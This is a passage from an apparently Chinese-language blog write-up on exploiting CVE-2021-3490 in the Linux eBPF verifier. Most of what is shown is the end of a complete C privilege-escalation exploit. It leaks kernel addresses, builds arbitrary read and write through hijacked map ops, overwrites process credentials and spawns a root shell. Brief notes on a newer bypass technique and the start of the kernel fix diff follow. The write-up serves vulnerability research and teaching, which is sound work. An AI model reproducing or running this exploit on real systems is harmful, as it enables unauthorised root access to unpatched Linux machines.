class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    data = info.btf_id;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    key = <span class="hljs-number">1</span>;<br>    value[<span class="hljs-number">0</span>] = addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = addr + <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    data = read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">2</span>);<br>    data &lt;&lt;= <span class="hljs-number">32</span>;<br>    data += read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> current_task, current_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">search_for_current_task</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> next_task = INIT_TASK + kernel_offset + <span class="hljs-number">0x818</span>;<br>    <span class="hljs-type">size_t</span> data;<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        next_task = read_arbitrary_addr(map_fd, next_task);<br>        data = read_arbitrary_addr(map_fd, next_task + <span class="hljs-number">0x2d0</span>);<br>    &#125; <span class="hljs-keyword">while</span> (data != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> next_task - <span class="hljs-number">0x818</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_ADDR(__map_fd)                         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV32_REG(VULN_REG, VULN_REG),              \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</span><br><br><span class="hljs-type">size_t</span> map_addr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        LEAK_MAP_ADDR(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_OPS(__map_fd)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br><br><span class="hljs-type">size_t</span> map_ops_addr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_ops_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        LEAK_MAP_OPS(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu_limit */</span>                      \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite spin_lock_off */</span>                   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),               \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite max_entries */</span>                     \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite map type */</span>                        \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite the map-&gt;ops */</span>                    \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span><br><br><span class="hljs-type">size_t</span> fake_ops_addr;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_arbitrary_write_ops</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        MAKE_ARBITRARY_WRITE_OPS(map_fd),<br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> per_ops_ptr, value[<span class="hljs-number">0x1000</span>], value_idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops_data</span>;</span><br><br>    <span class="hljs-comment">/* save fake ops addr into map */</span><br>    fake_ops_addr = map_addr + <span class="hljs-number">0x110</span> + MAP_SIZE;<br><br>    <span class="hljs-comment">/* read ops */</span><br>    value_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bpf_map_ops); i += <span class="hljs-number">8</span>) &#123;<br>        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);<br>        value[value_idx++] = per_ops_ptr;<br>    &#125;<br><br>    <span class="hljs-comment">/* load ops */</span><br>    ops_data = (<span class="hljs-keyword">struct</span> bpf_map_ops *) value;<br>    ops_data-&gt;map_push_elem = (<span class="hljs-type">void</span>*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* we&#x27;ll take fake ops&#x27;s addr from map */</span><br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = fake_ops_addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* hijack the map */</span><br>    run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">arbitrary_write_4_bytes_by_map</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> val)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> key;<br><br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = val - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], addr);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_MAP_DATA(__map_fd, __off)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, __off),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br><br><span class="hljs-comment">/* for debug only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_map_data</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> map_data[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x110</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>            TRIGGER_VULN(map_fd),<br>            MAKE_VULN_REG(map_fd),<br>            READ_MAP_DATA(map_fd, (<span class="hljs-number">0x110</span> - <span class="hljs-number">0x8</span> * i)), <br>            BPF_EXIT_INSN()<br>        &#125;;<br><br>        <span class="hljs-keyword">if</span> (run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to run bpf prog!&quot;</span>);<br>        &#125;<br><br>        key = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to look up the map!&quot;</span>);<br>        &#125;<br>        map_data[i] = value[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x200</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, map_data[i]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> map_fd;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> log_fd;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[=] CVE-2021-3490 explotation by arttnba3\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Creating new eBPF map...&quot;</span>);<br>    map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, MAP_SIZE, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-keyword">if</span> (map_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Leaking addr of bpf_map.ops ...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (leak_map_ops_addr(map_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to run the eBPF prog!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Checking for leek...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Got bad value: %lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>        err_exit(<span class="hljs-string">&quot;FAILED to leak kernel info!&quot;</span>);<br>    &#125;<br><br>    map_ops_addr = value[<span class="hljs-number">0</span>];<br>    kernel_offset = map_ops_addr - ARRAY_MAP_OPS;<br>    kernel_base += kernel_offset;<br>    init_cred = INIT_CRED + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get array_map_ops leak: \033[0m%lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel_offset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel_base: \033[0m%lx\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Leaking addr of bpf_map ...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (leak_map_addr(map_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to run the eBPF prog!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Checking for leek...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0xffff000000000000</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Got bad value: %lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>        err_exit(<span class="hljs-string">&quot;FAILED to leak addr of bpf_map!&quot;</span>);<br>    &#125;<br><br>    map_addr = value[<span class="hljs-number">0</span>] - <span class="hljs-number">0x110</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get addr of bpf_map: \033[0m%lx\n&quot;</span>, map_addr);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Search for current task_struct&#x27;s addr...&quot;</span>);<br>    current_task = search_for_current_task(map_fd);<br>    current_cred = read_arbitrary_addr(map_fd, current_task + <span class="hljs-number">0xad8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current task_struct&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current cred&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_cred);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Hijacking the bpf_map...&quot;</span>);<br>    make_arbitrary_write_ops(map_fd);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Overwriting the current-&gt;cred...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (arbitrary_write_4_bytes_by_map(map_fd, current_cred+<span class="hljs-number">4</span>+<span class="hljs-number">4</span>*i, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to ovwerwrite no.%d\033[0m\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to call ops-&gt;map_push_elem()!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* record the log in to file here */</span><br>    log_fd = open(<span class="hljs-string">&quot;./log.txt&quot;</span>, O_RDWR | O_CREAT);<br>    <span class="hljs-keyword">if</span> (log_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create log file!&quot;</span>);<br>    &#125;<br>    write(log_fd, bpf_log_buf, <span class="hljs-built_in">strlen</span>(bpf_log_buf));<br>    close(log_fd);<br><br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行即可完成提权：</p><p><img src="https://s2.loli.net/2023/06/07/x9RAdDMlZr4wF65.png" alt="image.png"></p><blockquote><p>第一次真正从头开始做 eBPF 相关的利用，说实话还是挺有意思的，不过虚拟机的各种实现细节确实比想象中要庞大得多（<del>那一天，a3 终于回忆起本科阶段做用户态 vm pwn 逆向半天逆到头大的痛苦</del>）</p></blockquote><h2 id="Extra-New-ALU-Sanitation-bypass"><a href="#Extra-New-ALU-Sanitation-bypass" class="headerlink" title="Extra. New ALU Sanitation bypass"></a>Extra. New ALU Sanitation bypass</h2><p>在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0">这个 commit</a> 中 ALU Sanitation 又得到了进一步的加强：</p><ul><li><code>alu_limit</code> 的计算方式发生了改变，不是使用指针寄存器的当前位置，而是使用一个 <code>offset</code> 寄存器</li><li>被认为是常数的寄存器赋值<strong>会被直接更改为常量赋值</strong></li></ul><p>这两个新特性的引入<strong>使得本文所用的攻击方法近乎完全失效</strong>，不过这并不代表我们不能完成利用，在 <a href="https://cjovi.icu/WP/1604.html">D^3CTF2022-d3bpf-v2</a> 中来自 vidar-team 的 chuj 师傅展示了一个新的技巧——由于 <code>bpf_skb_load_bytes()</code> 会将一个 <code>sk_buff</code> 的数据读到栈上，因此我们可以利用运行时为 1、verifier 确信为 0 的寄存器构造一个较长的 <code>len</code> 参数，<strong>从而使得数据拷贝时发生栈溢出</strong></p><p>我们或许还需要额外的办法泄露内核地址，一个可行的方式是直接造成 kernel oops 后通过 dmesg 泄露出内核信息，这个技巧对于总会设置 <code>oops=panic</code> 的 CTF 题并不可用，但是<strong>大部分的真实世界环境其实都不会在 soft panic 发生时直接 panic</strong> （<code>/proc/sys/kernel/panic_on_oops == 0</code>），因此这个方法的可行性其实还是挺高的</p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03. 漏洞修复"></a>0x03. 漏洞修复</h1><p>在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e">这个 commit</a> 中完成了对漏洞的修补操作,漏洞的修复方式也比较简单，只需要将缺失的设置 32 位边界的操作补充上就行：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs diff"><br><span class="hljs-comment">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="hljs-comment">index 757476c91c984..9352a1b7de2dd 100644</span><br><span class="hljs-comment">--- a/kernel/bpf/verifier.c</span><br><span class="hljs-comment">+++ b/kernel/bpf/verifier.c</span><br><span class="hljs-meta">@@ -7084,11 +7084,10 @@</span> static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> u32 umax_val = src_reg-&gt;u32_max_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_and will be called so its safe</span><br><span class="hljs-deletion">- * to skip updating register for known 32-bit case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get our minimum from the var_off, since that&#x27;s inherently<br>  * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.<br><span class="hljs-meta">@@ -7108,7 +7107,6 @@</span> static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,<br> dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;<br> dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;<br> &#125;<br><span class="hljs-deletion">-</span><br> &#125;<br> <br> static void scalar_min_max_and(struct bpf_reg_state *dst_reg,<br><span class="hljs-meta">@@ -7155,11 +7153,10 @@</span> static void scalar32_min_max_or(struct bpf_reg_state *dst_reg,<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> u32 umin_val = src_reg-&gt;u32_min_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_or will be called so it is 